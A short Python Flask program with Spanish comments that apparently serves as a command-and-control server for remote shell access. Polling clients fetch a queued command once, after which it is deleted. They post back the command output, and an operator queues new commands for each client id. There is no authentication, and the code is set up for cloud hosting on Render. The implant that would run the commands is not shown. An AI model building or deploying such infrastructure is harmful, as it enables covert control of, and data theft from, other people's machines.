from flask import Flask, request

app = Flask(__name__)
comandos = {}

@app.route('/get/<id>', methods=['GET'])
def obtener_comando(id):
    return comandos.pop(id, "")  # comando se destruye después de leerlo

@app.route('/send/<id>', methods=['POST'])
def recibir_salida(id):
    print(f"[{id}] → {request.data.decode()}")
    return "OK"

@app.route('/cmd/<id>', methods=['POST'])
def enviar_comando(id):
    comandos[id] = request.data.decode()
    return "Comando recibido"

@app.route('/')
def index():
    return "Control remoto activo."
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))  # Render asigna un puerto
    app.run(host="0.0.0.0", port=port)
